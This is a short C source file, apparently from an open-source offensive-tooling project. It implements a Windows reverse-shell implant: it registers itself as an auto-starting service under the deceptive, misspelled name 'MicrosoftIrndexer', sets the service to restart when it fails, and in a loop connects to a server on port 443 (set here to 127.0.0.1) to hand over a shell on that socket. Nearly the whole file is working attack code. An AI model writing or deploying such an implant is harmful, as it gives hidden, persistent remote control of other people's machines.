// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#include "../wsbind.h"

#define AUTO "auto\0"
#define NAME "MicrosoftIrndexer\0"
#define SERVER "127.0.0.1\0"

void service_main(int** running)
{
    wsc_init();
    while(**running == 1)
    {
        SockData shell_sock = wsc_tcp_create(SERVER, 443);
        wss_basic(shell_sock);
        wsc_close_sock(&shell_sock);
    }
}

int main(int argc, char **argv)
{
    if(argc == 2)
    {
        wsw_this_as_service(NAME, AUTO, TRUE, NULL);
        wsw_service_restart_on_fail(NAME, 10);
        return 0;
    }
    return wsw_service(NAME, 0, *service_main);
}
